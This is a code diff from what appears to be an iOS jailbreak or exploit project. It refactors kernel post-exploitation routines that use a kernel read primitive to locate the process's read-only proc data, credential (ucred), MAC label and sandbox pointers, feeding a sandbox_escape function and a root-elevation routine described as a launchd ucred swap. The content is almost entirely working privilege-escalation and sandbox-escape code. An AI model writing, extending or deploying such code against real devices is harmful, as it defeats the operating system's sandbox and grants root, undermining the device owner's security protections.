@@ -60,6 +60,69 @@ extern uint64_t pac_mask;
     ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
 #define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)
 
+static uint64_t read_proc_ro(uint64_t proc) {
+    uint32_t proc_ro_off = off_proc_p_proc_ro ? off_proc_p_proc_ro : OFF_PROC_PROC_RO;
+    return S(early_kread64(proc + proc_ro_off));
+}
+
+static bool validate_ucred(uint64_t ucred, uint64_t *label_out, uint64_t *sandbox_out) {
+    if (!K(ucred)) return false;
+
+    uint32_t label_off = off_ucred_cr_label ? off_ucred_cr_label : OFF_UCRED_CR_LABEL;
+    uint32_t sandbox_off = off_label_l_perpolicy_sandbox ? off_label_l_perpolicy_sandbox : OFF_LABEL_SANDBOX;
+
+    uint64_t label = S(early_kread64(ucred + label_off));
+    if (!K(label)) return false;
+
+    uint64_t sandbox = S(early_kread64(label + sandbox_off));
+    if (!K(sandbox)) return false;
+
+    if (label_out) *label_out = label;
+    if (sandbox_out) *sandbox_out = sandbox;
+    return true;
+}
+
+static uint64_t find_ucred_in_proc_ro(uint64_t proc_ro, uint64_t *label_out,
+                                      uint64_t *sandbox_out, uint32_t *slot_out) {
+    uint32_t preferred = off_proc_ro_p_ucred ? off_proc_ro_p_ucred : OFF_PROC_RO_UCRED;
+    if (preferred) {
+        uint64_t raw = early_kread64(proc_ro + preferred);
+        uint64_t smr = kread_smrptr(proc_ro + preferred);
+        uint64_t pac = S(raw);
+        NSLog(@"[SBX] preferred ucred slot proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx",
+              preferred, raw, smr, pac);
+
+        if (validate_ucred(smr, label_out, sandbox_out)) {
+            if (slot_out) *slot_out = preferred;
+            return smr;
+        }
+        if (validate_ucred(pac, label_out, sandbox_out)) {
+            if (slot_out) *slot_out = preferred;
+            return pac;
+        }
+    }
+
+    NSLog(@"[SBX] Scanning proc_ro for ucred fallback...");
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        if (off == preferred) continue;
+        uint64_t raw = early_kread64(proc_ro + off);
+        uint64_t smr = kread_smrptr(proc_ro + off);
+        uint64_t pac = S(raw);
+        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx",
+              off, raw, smr, pac);
+
+        if (validate_ucred(smr, label_out, sandbox_out)) {
+            if (slot_out) *slot_out = off;
+            return smr;
+        }
+        if (validate_ucred(pac, label_out, sandbox_out)) {
+            if (slot_out) *slot_out = off;
+            return pac;
+        }
+    }
+    return 0;
+}
+
 #pragma mark - Extension patching
 
 static void patch_ext(uint64_t ext) {
@@ -114,53 +177,20 @@ static void set_rw_class(uint64_t hdr) {
 int sandbox_escape(uint64_t self_proc) {
     if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
 
-    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
+    uint32_t proc_ro_off = off_proc_p_proc_ro ? off_proc_p_proc_ro : OFF_PROC_PROC_RO;
+    uint64_t proc_ro_raw = early_kread64(self_proc + proc_ro_off);
     uint64_t proc_ro = S(proc_ro_raw);
-    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
+    NSLog(@"[SBX] self_proc=0x%llx proc_ro_off=0x%x proc_ro_raw=0x%llx proc_ro=0x%llx",
+          self_proc, proc_ro_off, proc_ro_raw, proc_ro);
     if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
 
-    // Scan proc_ro for ucred — offset varies by iOS build.
-    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    NSLog(@"[SBX] Scanning proc_ro for ucred...");
-    uint64_t ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
-
-        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (K(smr)) {
-            uint64_t maybe_label = S(early_kread64(smr + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
-                    ucred = smr;
-                    break;
-                }
-            }
-        }
-        // Also try PAC-stripped
-        if (!ucred && K(pac)) {
-            uint64_t maybe_label = S(early_kread64(pac + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
-                    ucred = pac;
-                    break;
-                }
-            }
-        }
-    }
+    // Prefer Darksword's version/device offsets, then fall back to a bounded scan.
+    uint64_t label = 0;
+    uint64_t sandbox = 0;
+    uint32_t ucred_slot = 0;
+    uint64_t ucred = find_ucred_in_proc_ro(proc_ro, &label, &sandbox, &ucred_slot);
     if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
-
-    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
-
-    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
+    NSLog(@"[SBX] Found ucred at proc_ro+0x%x = 0x%llx", ucred_slot, ucred);
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
     if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
@@ -210,32 +240,19 @@ int sandbox_escape(uint64_t self_proc) {
 
 #pragma mark - UID elevation (uid=0 via launchd ucred swap)
 
-// Scan proc_ro in [0x10..0x40] for a valid ucred pointer.
-// A valid ucred has cr_label at +0x78 pointing to a kernel addr
+// Resolve a valid ucred pointer using the same offset-aware path as sandbox_escape.
 static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
     if (!proc) return -1;
-    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
+    uint64_t proc_ro = read_proc_ro(proc);
     if (!K(proc_ro)) return -1;
 
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        uint64_t cands[2] = { smr, pac };
-        for (int i = 0; i < 2; i++) {
-            uint64_t c = cands[i];
-            if (!K(c)) continue;
-            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
-            if (!K(lbl)) continue;
-            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
-            if (K(sbx)) {
-                *ucred_out = c;
-                *off_out = off;
-                return 0;
-            }
-        }
-    }
-    return -1;
+    uint32_t slot = 0;
+    uint64_t ucred = find_ucred_in_proc_ro(proc_ro, NULL, NULL, &slot);
+    if (!K(ucred)) return -1;
+
+    if (ucred_out) *ucred_out = ucred;
+    if (off_out) *off_out = slot;
+    return 0;
 }
 
 static uint64_t sbx_ucredbyproc(uint64_t proc) {
